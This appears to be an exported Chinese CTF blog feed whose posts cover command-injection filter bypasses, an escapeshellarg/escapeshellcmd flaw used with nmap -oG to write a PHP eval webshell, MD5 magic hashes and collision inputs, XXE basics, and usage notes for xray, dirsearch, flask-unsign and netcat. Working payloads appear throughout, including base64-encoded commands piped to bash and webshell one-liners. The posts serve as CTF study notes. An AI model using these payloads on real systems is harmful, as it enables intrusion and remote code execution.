后面加个$与&#123;&#125;类似，起截断作用，$9是当前系统shell进程第九个参数持有者，始终为空字符串，如cat$IFS2$9flag.php</code></pre><h1 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h1><h2 id="拼接"><a href="#拼接" class="headerlink" title="拼接"></a>拼接</h2><pre><code class="php">a=c;b=at;c=flag;$a$b $ca=c;b=at;c=heb;d=ic;ab&#123;c&#125;&#123;d&#125;</code></pre><h2 id="base64编码"><a href="#base64编码" class="headerlink" title="base64编码"></a>base64编码</h2><pre><code class="php">echo MTIzCg==|base64 -d 其将会打印123echo &quot;Y2F0IC9mbGFn&quot;|base64-d|bash ==&gt;cat /flag</code></pre><h2 id="hex编码"><a href="#hex编码" class="headerlink" title="hex编码"></a>hex编码</h2><pre><code class="php">echo &quot;636174202f666c6167&quot; | xxd -r -p|bash ==&gt;cat /flag</code></pre><h2 id="单引号和双引号绕过"><a href="#单引号和双引号绕过" class="headerlink" title="单引号和双引号绕过"></a>单引号和双引号绕过</h2><pre><code class="php">ca&#39;&#39;t flag 或ca&quot;&quot;t flagca&#39;&#39;t te&quot;&quot;st.php</code></pre><h2 id="反斜杠绕过"><a href="#反斜杠绕过" class="headerlink" title="反斜杠绕过"></a>反斜杠绕过</h2><pre><code class="php">ca\t fl\agcat te\st.php</code></pre><h2 id="绕过ip中的句点"><a href="#绕过ip中的句点" class="headerlink" title="绕过ip中的句点"></a>绕过ip中的句点</h2><pre><code class="php">网络地址可以转换成数字地址，比如127.0.0.1可以转化为2130706433。可以直接访问http://2130706433或者http://0x7F000001，这样就可以绕过.的ip过滤。在线转换地址：数字转IP地址 IP地址转数字 域名转数字IP</code></pre><h1 id="绕过长度限制"><a href="#绕过长度限制" class="headerlink" title="绕过长度限制"></a>绕过长度限制</h1><h2 id="通过-gt-来创建文件"><a href="#通过-gt-来创建文件" class="headerlink" title="通过&gt;来创建文件"></a>通过&gt;来创建文件</h2><pre><code class="php">&gt;flag.txt</code></pre><h2 id="通过-gt-将命令结果存入文件中"><a href="#通过-gt-将命令结果存入文件中" class="headerlink" title="通过&gt;将命令结果存入文件中"></a>通过&gt;将命令结果存入文件中</h2><pre><code class="php">echo &quot;hello hacker&quot; &gt; flag.txt</code></pre><h2 id="gt-gt-符号的作用是将字符串添加到文件内容末尾，不会覆盖原内容"><a href="#gt-gt-符号的作用是将字符串添加到文件内容末尾，不会覆盖原内容" class="headerlink" title="&gt;&gt;符号的作用是将字符串添加到文件内容末尾，不会覆盖原内容"></a>&gt;&gt;符号的作用是将字符串添加到文件内容末尾，不会覆盖原内容</h2><pre><code class="php">echo &quot;hello hacker&quot; &gt;&gt; flag.txt</code></pre><h2 id="Linux中命令换行"><a href="#Linux中命令换行" class="headerlink" title="Linux中命令换行"></a>Linux中命令换行</h2><p>在Linux中，当我们执行文件中的命令的时候，我们通过在没有写完的命令后面加\，可以将一条命令写在多行。<br>比如：cat flag</p><pre><code class="php">ca\t\ fla\g.txt将命令一条一条输入一个文本中再执行:root@kali:~# echo &quot;ca\\&quot;&gt;cmdroot@kali:~# echo &quot;t\\&quot;&gt;&gt;cmdroot@kali:~# echo &quot; fl\\&quot;&gt;&gt;cmdroot@kali:~# echo &quot;ag&quot;&gt;&gt;cmdroot@kali:~# cat cmdca\t\ fl\agroot@kali:~# sh cmdthis is your flag</code></pre><h2 id="ls命令"><a href="#ls命令" class="headerlink" title="ls命令"></a>ls命令</h2><pre><code class="php">ls -a 列出文件下所有的文件，包括以“.“开头的隐藏文件（linux下文件隐藏文件是以.开头的，如果存在..代表存在着父目录）。ls -l 列出文件的详细信息，如创建者，创建时间，文件的读写权限列表等等。ls -F 在每一个文件的末尾加上一个字符说明该文件的类型。&quot;@&quot;表示符号链接、&quot;|&quot;表示FIFOS、&quot;/&quot;表示目录、&quot;=&quot;表示套接字。ls -s 在每个文件的后面打印出文件的大小。 size(大小)ls -t 按时间进行文件的排序 Time(时间)ls -A 列出除了&quot;.&quot;和&quot;..&quot;以外的文件。ls -R 将目录下所有的子目录的文件都列出来，相当于我们编程中的“递归”实现ls -L 列出文件的链接名。Link（链接）ls -S 以文件的大小进行排序</code></pre><h1 id="各种读文件命令"><a href="#各种读文件命令" class="headerlink" title="各种读文件命令"></a>各种读文件命令</h1><pre><code class="php">cat--由第一行开始显示内容，并将所有内容输出tac--从最后一行倒序显示内容，并将所有内容输出more-- 根据窗口大小，一页一页的现实文件内容less 和more类似，但其优点可以往前翻页，而且进行可以搜索字符head-- 只显示头几行tail --只显示最后几行nl --类似于cat -n，显示时输出行号tailf-- 类似于tail -fvim --使用vim工具打开文本vi --使用vi打开文本cat 由第一行开始显示内容，并将所有内容输出</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 常见漏洞和手法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 命令执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>escapeshellarg+escapeshellcmd 函数漏洞</title>
      <link href="/2021/10/08/escapeshellarg+escapeshellcmd%20%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/"/>
      <url>/2021/10/08/escapeshellarg+escapeshellcmd%20%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p> escapeshellarg(string $arg): string<br>escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含 exec(), system() 执行运算符 。<br>escapeshellcmd<br> escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。</p><p>反斜线（\）会在以下字符之前插入： &amp;#;`|*?~&lt;&gt;^()[]{}$, \x0A 和 \xFF。 ‘ 和 “ 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。 </p><p>这两个函数在一起用会有些问题.PS:先用escapeshellarg再用escapeshellcmd才会有这个问题<br>传入的参数是：172.17.0.2’ -v -d a=1<br>经过escapeshellarg处理后变成了’172.17.0.2’&#39;‘ -v -d a=1’，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。<br>经过escapeshellcmd处理后变成’172.17.0.2’\‘’ -v -d a=1&#39;，这是因为escapeshellcmd对\以及最后那个不配对儿的引号进行了转义：<a href="http://php.net/manual/zh/function.escapeshellcmd.php">http://php.net/manual/zh/function.escapeshellcmd.php</a><br>最后执行的命令是curl ‘172.17.0.2’\‘’ -v -d a=1&#39;，由于中间的\被解释为\而不再是转义字符，所以后面的’没有被转义，与再后面的’配对儿成了一个空白连接符。所以可以简化为curl 172.17.0.2\ -v -d a=1’，即向172.17.0.2\发起请求，POST 数据为a=1’。</p><p>两次转译后出现了问题，没有考虑到单引号的问题</p><p>nmap命令中 有一个参数-oG可以实现将命令和结果写到文件<br>?host=’ <?php @eval($_POST["hack"]);?> -oG hack.php ‘</p><p>总结当两个函数按这样顺序一起使用，使用过滤就没有意义了</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 常见漏洞和手法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 函数 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nmap结合代码执行</title>
      <link href="/2021/10/08/Nmap%E6%96%B9%E9%9D%A2%E7%9A%84%E8%80%83%E5%AF%9F/"/>
      <url>/2021/10/08/Nmap%E6%96%B9%E9%9D%A2%E7%9A%84%E8%80%83%E5%AF%9F/</url>
      
        <content type="html"><![CDATA[<p>选项 解释<br>-oN 标准保存<br>-oX XML保存<br>-oG Grep保存<br>-oA 保存到所有格式<br>-append-output 补充保存文件<br>-F 实行一次快速扫描<br>选项-oG<br>将结果Grep保存<br>nmap -F -oG test.txt 192.168.23.1<br>nmap命令中 有一个参数-oG可以实现将命令和结果写到文件<br>?host=’ <?php @eval($_POST["hack"]);?> -oG hack.php ‘<br>传入的参数经过了escapeshellarg与escapeshellcmd两个函数的处理，导致在hack.php’这样的情况下会产生hack.php\,解决办法就是在单引号前加空格</p><p>选项-oA<br>该选项可将扫描结果以标准格式、XML格式和Grep格式一次性保存，分别放在.nmap，.xml和.gnmap文件中。<br>nmap -F -oA test 192.168.3.2</p><p>‘ -oN b.phtml <?=eval(\$_POST[a]);?>‘</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 常见漏洞和手法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码执行,nmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MD5碰撞脚本</title>
      <link href="/2021/10/08/md5%E7%A2%B0%E6%92%9E%E8%84%9A%E6%9C%AC/"/>
      <url>/2021/10/08/md5%E7%A2%B0%E6%92%9E%E8%84%9A%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<p>0x04 MD5碰撞脚本<br>授人以鱼不如授人以渔，下面使多线程MD5哈希碰撞脚本，威力巨大。是根据网上代码改编而成，非原创。</p><pre><code># -*- coding: utf-8 -*-import multiprocessingimport hashlibimport randomimport stringimport sysCHARS = string.letters + string.digitsdef cmp_md5(substr, stop_event, str_len,. start=0, size=20):    global CHARS    while not stop_event.is_set():        rnds = &#39;&#39;.join(random.choice(CHARS) for _ in range(size))        md5 = hashlib.md5(rnds)        value = md5.hexdigest()        if value[start: start+str_len] == substr:            print rnds            stop_event.set()            &#39;&#39;&#39;            #碰撞双md5            md5 = hashlib.md5(value)            if md5.hexdigest()[start: start+str_len] == substr:                print rnds+ &quot;=&gt;&quot; + value+&quot;=&gt;&quot;+ md5.hexdigest()  + &quot;\n&quot;                stop_event.set()            &#39;&#39;&#39; if __name__ == &#39;__main__&#39;:    substr = sys.argv[1].strip()    start_pos = int(sys.argv[2]) if len(sys.argv) &gt; 1 else 0    str_len = len(substr)    cpus = multiprocessing.cpu_count()    stop_event = multiprocessing.Event()    processes = [multiprocessing.Process(target=cmp_md5, args=(substr,                                         stop_event, str_len, start_pos))                 for i in range(cpus)]    for p in processes:        p.start()    for p in processes:        p.join()</code></pre><p>上面脚本注释部分是双MD5碰撞，取消注释然后注释掉16行即可。</p><p>使用方法：python md5Crack.py “你要碰撞的字符串” 字符串的起始位置</p><p>例如：python md5Crack.py “0e” 0</p><p>将产生MD5值为0e开头的字符串。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 脚本 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 脚本 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MD5绕过手法</title>
      <link href="/2021/10/08/MD5%E6%BC%8F%E6%B4%9E/"/>
      <url>/2021/10/08/MD5%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p>ffifdyop，这个点的原理是 ffifdyop 这个字符串被 md5 哈希了之后会变成 276f722736c95d99e921722cf9ed621c，<br>再转换为字符串：’or’6&lt;乱码&gt;  即  ‘or’66�]��!r,��b<br>这个字符串前几位刚好是 ‘ or ‘6，</p><p>md5(string,raw)</p><p>md5()进行比较时，可以两个里面输入数组，这样都是False,等于，可以绕过</p><p>0e绕过</p><pre><code>0e开头的字符串在参与比较时,会被当做科学计数法,结果转换为0</code></pre><p> 比如将两个md5值进行弱类型比较</p><p>md5(‘QNKCDZO’) == md5(240610708)</p><p>MD5加密后会变成这个样子</p><p>0e830400451993494058024219903391 == 0e462097431906509019562988736854</p><p>由于0e开头的字符串会转换为0,所以真正比较的过程会变成下面这样</p><p>0 == 0</p><p>返回结果为true,也就是说0e开头的md5值进行弱类型比较时,结果相等<br>s878926199a<br>0e545993274517709034328855841020<br>s155964671a<br>0e342768416822451524974117254469<br>s214587387a<br>0e848240448830537924465865611904<br>s214587387a<br>0e848240448830537924465865611904<br>s878926199a<br>0e545993274517709034328855841020</p><p>强类型<br>(string)$_POST[‘a’]!==(string)$_POST[‘b’] &amp;&amp; md5($_POST[‘a’])===md5($_POST[‘b’])<br>a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</p><p>收录一些MD5值相等的字符串</p><pre><code>$Param1=&quot;\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x00\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\x55\x5d\x83\x60\xfb\x5f\x07\xfe\xa2&quot;;$Param2=&quot;\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x02\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\xd5\x5d\x83\x60\xfb\x5f\x07\xfe\xa2&quot;;$data1=&quot;\xd1\x31\xdd\x02\xc5\xe6\xee\xc4\x69\x3d\x9a\x06\x98\xaf\xf9\x5c\x2f\xca\xb5\x07\x12\x46\x7e\xab\x40\x04\x58\x3e\xb8\xfb\x7f\x89\x55\xad\x34\x06\x09\xf4\xb3\x02\x83\xe4\x88\x83\x25\xf1\x41\x5a\x08\x51\x25\xe8\xf7\xcd\xc9\x9f\xd9\x1d\xbd\x72\x80\x37\x3c\x5b\xd8\x82\x3e\x31\x56\x34\x8f\x5b\xae\x6d\xac\xd4\x36\xc9\x19\xc6\xdd\x53\xe2\x34\x87\xda\x03\xfd\x02\x39\x63\x06\xd2\x48\xcd\xa0\xe9\x9f\x33\x42\x0f\x57\x7e\xe8\xce\x54\xb6\x70\x80\x28\x0d\x1e\xc6\x98\x21\xbc\xb6\xa8\x83\x93\x96\xf9\x65\xab\x6f\xf7\x2a\x70&quot;;$data2=&quot;\xd1\x31\xdd\x02\xc5\xe6\xee\xc4\x69\x3d\x9a\x06\x98\xaf\xf9\x5c\x2f\xca\xb5\x87\x12\x46\x7e\xab\x40\x04\x58\x3e\xb8\xfb\x7f\x89\x55\xad\x34\x06\x09\xf4\xb3\x02\x83\xe4\x88\x83\x25\x71\x41\x5a\x08\x51\x25\xe8\xf7\xcd\xc9\x9f\xd9\x1d\xbd\xf2\x80\x37\x3c\x5b\xd8\x82\x3e\x31\x56\x34\x8f\x5b\xae\x6d\xac\xd4\x36\xc9\x19\xc6\xdd\x53\xe2\xb4\x87\xda\x03\xfd\x02\x39\x63\x06\xd2\x48\xcd\xa0\xe9\x9f\x33\x42\x0f\x57\x7e\xe8\xce\x54\xb6\x70\x80\xa8\x0d\x1e\xc6\x98\x21\xbc\xb6\xa8\x83\x93\x96\xf9\x65\x2b\x6f\xf7\x2a\x70&quot;;</code></pre><p>双md5结果仍为0e开头字符串大全</p><pre><code>MD5大全： CbDLytmyGm2xQyaLNhWn md5(CbDLytmyGm2xQyaLNhWn) =&gt; 0ec20b7c66cafbcc7d8e8481f0653d18 md5(md5(CbDLytmyGm2xQyaLNhWn)) =&gt; 0e3a5f2a80db371d4610b8f940d296af 770hQgrBOjrcqftrlaZk md5(770hQgrBOjrcqftrlaZk) =&gt; 0e689b4f703bdc753be7e27b45cb3625 md5(md5(770hQgrBOjrcqftrlaZk)) =&gt; 0e2756da68ef740fd8f5a5c26cc45064 7r4lGXCH2Ksu2JNT3BYM md5(7r4lGXCH2Ksu2JNT3BYM) =&gt; 0e269ab12da27d79a6626d91f34ae849 md5(md5(7r4lGXCH2Ksu2JNT3BYM)) =&gt; 0e48d320b2a97ab295f5c4694759889f</code></pre><p>md5(‘0e215962017’) ==&gt; “0e291242476940776845150308577824”</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 常见漏洞和手法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 绕过 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xml漏洞</title>
      <link href="/2021/10/08/xml%E6%BC%8F%E6%B4%9E/"/>
      <url>/2021/10/08/xml%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p>XXE漏洞全称XML External Entity Injection即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。xxe漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。</p><ul><li><p>XML被设计为传输和存储数据，其焦点是数据的内容。</p></li><li><p>HTML被设计用来显示数据，其焦点是数据的外观。</p></li><li><p>所有 XML 元素都须有关闭标签。</p></li><li><p>XML 标签对大小写敏感。</p></li><li><p>XML 必须正确地嵌套。</p></li><li><p>XML 文档必须有根元素。</p></li><li><p>XML 的属性值须加引号</p></li><li><p>所有 XML 元素都须有关闭标签。</p></li><li><p>XML 标签对大小写敏感。</p></li><li><p>XML 必须正确地嵌套。</p></li><li><p>XML 文档必须有根元素。</p></li><li><p>XML 的属性值须加引号。<br><code>&lt;message&gt;hello &lt; world&lt;/message&gt;</code>,为了避免错误。我们用实体引用<code>&amp;lt;</code>来代替”&lt;”字符。XML中，有5个预定义的实体引用。<br>&amp;lt &lt;<br>&amp;gt &gt;<br>&amp;amp &amp;<br>&amp;apos ‘<br>&amp;quot ‘<br>语法：<!-- --></p></li></ul><p>内部声明：</p><p><img src="/2021/10/08/xml%E6%BC%8F%E6%B4%9E/image-20220311140522532.png" alt="image-20220311140522532"></p><p>外部声明：</p><p>​    <img src="/2021/10/08/xml%E6%BC%8F%E6%B4%9E/image-20220311140536481.png" alt="image-20220311140536481"></p><p>xml实体：<br><?xml version="1.0" encoding="utf-8"?></p><p><img src="/2021/10/08/xml%E6%BC%8F%E6%B4%9E/image-20220311140547883.png" alt="image-20220311140547883"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 常见漏洞和手法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xml </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小知识点</title>
      <link href="/2021/10/08/%E5%B0%8F%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
      <url>/2021/10/08/%E5%B0%8F%E7%9F%A5%E8%AF%86%E7%82%B9/</url>
      
        <content type="html"><![CDATA[<p>php中可以把函数名通过字符串的方式传递给一个变量，然后通过此变量动态调用函数比如下面的代码会执行 system(‘ls’);<br>$a=’system’;<br>$a(‘ls’);</p><p>寻找flag文件常用命令小结：<br>    system(‘ls’) : 列举当前目录下的所有文件<br>    system(“find / -name flag<em>”)：查找所有文件名匹配flag</em>的文件<br>    system(“cat $(find / -name flag*)”)：打印所有文件名匹配flag*的文件</p><p>如果网站存在备份文件，常见的备份文件后缀名有：“.git” 、“.svn”、“ .swp”“.~”、“.bak”、“.bash_history”、“.bkf”</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 常见漏洞和手法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小知识点 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常见绕过方法</title>
      <link href="/2021/10/08/%E7%BB%95%E8%BF%87/"/>
      <url>/2021/10/08/%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<p>空格替代:<br>    ${IFS}<br>    $IFS$9<br>    &lt;<br>    &lt;&gt;<br>    {,}</p><hr><p>sh</p><p>/?ip=127.0.0.1;echo$IFS$2Y2F0IGZsYWcucGhw|base64$IFS$2-d|sh</p><p>变量拼接：<br>/?ip=127.0.0.1;a=g;cat$IFS$2fla$a.php</p><p>内联注释(将反引号命令的结果作为输入来执行命令)<br>/?ip=127.0.0.1;cat$IFS$2<code>ls</code></p><p>查看命令补充<br>    cat     由第一行开始显示内容，并将所有内容输出<br>    tac     从最后一行倒序显示内容，并将所有内容输出<br>    more    根据窗口大小，一页一页的现实文件内容<br>    less    和more类似，但是是从后往前翻页并且，进行可以搜索字符<br>    head    只显示头几行<br>    tail    只显示最后几行<br>    nl      类似于cat -n，显示时输出行号</p><hr><p>进制绕过<br>php中可以把函数名通过字符串的方式传递给一个变量，然后通过此变量动态调用函数比如下面的代码会执行 system(‘ls’);</p><p>$a=’system’;<br>$a(‘ls’);</p><p>常用函数：base_convert(“1001”2,10)是将二进制的1001转换为10进制<br>dechex 10进制转成16进制<br>hex2bin  16进制转成字符串的函数<br>_GET</p><p><a href="http://4f07a754-92bf-4411-8bd8-a8da7ec1c514.node4.buuoj.cn:81/?c=$p=base_convert(37907361743,10,36)dechex(1598506324);$$p=%7B&#39;system&#39;};$$p">http://4f07a754-92bf-4411-8bd8-a8da7ec1c514.node4.buuoj.cn:81/?c=$p=base_convert(37907361743,10,36)dechex(1598506324);$$p={&#39;system&#39;};$$p</a>(cat /flag)<br>c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi{pi}($$pi{abs})&amp;pi=system&amp;abs=cat /flag<br>$_GET{pi}($_GET{abs})  pi=system abs=cat /flag<br>本来是$_GET[]   –&gt;如果[]被过滤可以用$_GET{}</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 常见漏洞和手法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 绕过 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常见软件命令</title>
      <link href="/2021/10/08/%E5%B8%B8%E8%A7%81%E8%BD%AF%E4%BB%B6%E5%91%BD%E4%BB%A4/"/>
      <url>/2021/10/08/%E5%B8%B8%E8%A7%81%E8%BD%AF%E4%BB%B6%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="xray"><a href="#xray" class="headerlink" title="xray"></a>xray</h1><h2 id="单个url检测"><a href="#单个url检测" class="headerlink" title="单个url检测"></a>单个url检测</h2><p>./xray_windows_amd64 webscan –url <a href="https://xxx.edu.cn/">https://xxx.edu.cn</a> –html-output edu.html</p><h2 id="批量检测"><a href="#批量检测" class="headerlink" title="批量检测"></a>批量检测</h2><p>./xray_windows_amd64 webscan –url-file edu.txt –html-output e du.html</p><p> E:\sakura的工具箱\扫描\xray\xray_windows_amd64.exe webscan –url-file C:\Users\Sakura\Desktop\target.txt –html-output C:\Users\Sakura\Desktop\edus.html</p><h1 id="dirsearch使用"><a href="#dirsearch使用" class="headerlink" title="dirsearch使用:"></a>dirsearch使用:</h1><p>dirsearch自带的字典在db目录下</p><p>常用的参数有</p><ul><li><p>-u 指定网址</p></li><li><p>-e 指定网站语言</p></li><li><p>-w 指定字典</p></li><li><p>-r 递归目录（跑出目录后，继续跑目录下面的目录）</p></li><li><p>–random-agents 使用随机UA</p></li><li><p>-t 指定线程</p></li><li><p>–random-agents 使用随机US（默认再db/user-agents.txt中，可以自己添加）</p></li><li><p>-x 排除指定状态码 </p></li><li><p>-s 请求之间得延时（秒）</p></li><li><p>扫描网站zip以及php文件排除403状态码</p><pre><code> dirsearch.py -u http://127.0.0.1  -e php,zip -x 403</code></pre><p>扫描所有类型并且设置线程为20默认为10</p><pre><code> dirsearch.py -u http://127.0.0.1 -e*-t 20</code></pre><p>自定义字典扫描</p><pre><code>dirsearch.py -u http://127.0.0.1  -e* -w db/php.txt</code></pre><p>使用随机ua头</p><pre><code>dirsearch.py -u http://127.0.0.1  -e* --random-agents</code></pre><p>指定cookie扫描</p><pre><code>dirsearch.py -u http://127.0.0.1:999  -e* -c &quot;user=Mo60;&quot;</code></pre><p>递归扫描最大3层</p><pre><code>dirsearch.py -u http://127.0.0.1  -e* -r 3</code></pre><p>每一秒扫描一次</p><pre><code>dirsearch.py -u http://127.0.0.1  -e* -s 1</code></pre><p>关于字典</p><p>字典必须是文本文件,使用特殊词％EXT％,会在扫描时候根据 -e 传进来的值生成对应的字典</p><p>例:</p><pre><code>Mo60.%EXT%</code></pre><p>使用以下语句去扫描</p><pre><code class="bash"> dirsearch.py -u http://127.0.0.1 -e jsp -w db/str.txt</code></pre></li></ul><pre><code>python dirsearch.py -u http://node4.buuoj.cn:25833/ -e * -s 1 -x 400,403,404,500,503,429 -w C:\Users\Sakura\Desktop\dic\备份.txt -o C:\Users\Sakura\Desktop\1.txt</code></pre><pre><code>python dirsearch.py  -u http://7580b1d4-c607-4a67-a008-092706787c67.node4.buuoj.cn:81/ -e * --timeout=2 -t 1 -x 400,403,404,500,503,429 -o C:\Users\Sakura\Desktop\1.txt</code></pre><pre><code>python dirsearch.py -u http://xxx.com/ --header-list=E:\sakura的工 具箱\字典\user-gent.txt -e * -s 1 -t 3 --full-url --proxy=http://127.0.0.1:1080</code></pre><h1 id="Flask-Unsign"><a href="#Flask-Unsign" class="headerlink" title="Flask-Unsign"></a>Flask-Unsign</h1><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>要安装应用程序，只需使用pip:</p><pre><code>$ pip3 install flask-unsign[wordlist]</code></pre><p>如果您只想安装核心代码，请省略<code>[wordlist]</code>后缀：</p><pre><code>$ pip3 install flask-unsign</code></pre><p>要出于开发目的安装该工具，请运行以下命令（下载副本后）：</p><pre><code>$ pip3 install -e .[test]</code></pre><h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><p>要获得所有可能选项的概述，只需调用flask unsign without 任何这样的参数：</p><pre><code>$ flask-unsign</code></pre><h3 id="获取解码会话cookies"><a href="#获取解码会话cookies" class="headerlink" title="获取解码会话cookies"></a>获取解码会话cookies</h3><p>由于flask cookies是<strong>签名的</strong>和<strong>未加密的</strong>，因此 可以对会话数据进行本地解码。为此，可以使用<code>--decode</code> 争论。</p><p>会话cookies可以通过使用代理检查您的http请求来获得 像burp代理一样，使用浏览器的网络检查器或浏览器 查看/更改cookies的扩展。默认情况下，flask使用会话名称 <code>&quot;session&quot;</code>。</p><pre><code>$ flask-unsign --decode --cookie &#39;eyJsb2dnZWRfaW4iOmZhbHNlfQ.XDuWxQ.E2Pyb6x3w-NODuflHoGnZOEpbH8&#39;&#123;&#39;logged_in&#39;: False&#125;</code></pre><p>您还可以通过 传递<code>--server</code>参数，而不是<code>--cookie</code>参数。<em>do注释 但是，<strong>并不是所有网页都可能返回会话，因此请确保传递 是的网址。</strong></em></p><pre><code>$ flask-unsign --decode --server &#39;https://www.example.com/login&#39;[*] Server returned HTTP 302 (FOUND)[+] Successfully obtained session cookie: eyJsb2dnZWRfaW4iOmZhbHNlfQ.XDuWxQ.E2Pyb6x3w-NODuflHoGnZOEpbH8&#123;&#39;logged_in&#39;: False&#125;</code></pre><h3 id="未签名（强制使用密钥）"><a href="#未签名（强制使用密钥）" class="headerlink" title="未签名（强制使用密钥）"></a><strong>未签名（强制使用密钥）</strong></h3><p><strong>在获得一个示例会话cookie之后，您将能够尝试使用暴力 服务器的密钥。如果你幸运的话，这可能会被设置成 猜猜看，或者是在网上找到的，可能在你的一个词表里。为了 这样，就可以使用<code>--unsign</code>参数。</strong></p><pre><code>$ flask-unsign --unsign --cookie &lt; cookie.txt[*] Session decodes to: &#123;&#39;logged_in&#39;: False&#125;[*] No wordlist selected, falling back to default wordlist..[*] Starting brute-forcer with 8 threads..[+] Found secret key after 351 attempts&#39;CHANGEME&#39;</code></pre><h3 id="签名（会话操作）"><a href="#签名（会话操作）" class="headerlink" title="签名（会话操作）"></a><strong>签名（会话操作）</strong></h3><p><strong>一旦你获得了服务器的密钥，你就可以自己设计 自定义会话数据。为此，可以使用<code>--sign</code>参数。</strong></p><pre><code>$ flask-unsign --sign --cookie &quot;&#123;&#39;logged_in&#39;: True&#125;&quot; --secret &#39;CHANGEME&#39;eyJsb2dnZWRfaW4iOnRydWV9.XDuW-g.cPCkFmmeB7qNIcN-ReiN72r0hvU</code></pre><h1 id="NC"><a href="#NC" class="headerlink" title="NC"></a>NC</h1><p>nc(NetCat)，在网络工具中有”瑞士军刀”的美誉，它短小精悍，功能强大。</p><p><strong>基本参数</strong></p><pre><code>想要连接到某处: nc [-options] hostname port[s] [ports] …绑定端口等待连接: nc -l -p port [-options] [hostname] [port]参数:-g gateway source-routing hop point[s], up to 8-G num source-routing pointer: 4, 8, 12, …-h 帮助信息-i secs 延时的间隔-l 监听模式，用于入站连接-n 指定数字的IP地址，不能用hostname-o file 记录16进制的传输-p port 本地端口号-r 任意指定本地及远程端口-s addr 本地源地址-u UDP模式-v 详细输出——用两个-v可得到更详细的内容-w secs timeout的时间-z 将输入输出关掉——用于扫描时，其中端口号可以指定一个或者用lo-hi式的指定范围。</code></pre><p><strong>简单用法举例</strong><br>1 、端口扫描</p><pre><code class="text">nc -v -w 2 192.168.2.34 -z 21-24nc: connect to 192.168.2.34 port 21 (tcp) failed: Connection refusedConnection to 192.168.2.34 22 port [tcp/ssh] succeeded!nc: connect to 192.168.2.34 port 23 (tcp) failed: Connection refusednc: connect to 192.168.2.34 port 24 (tcp) failed: Connection 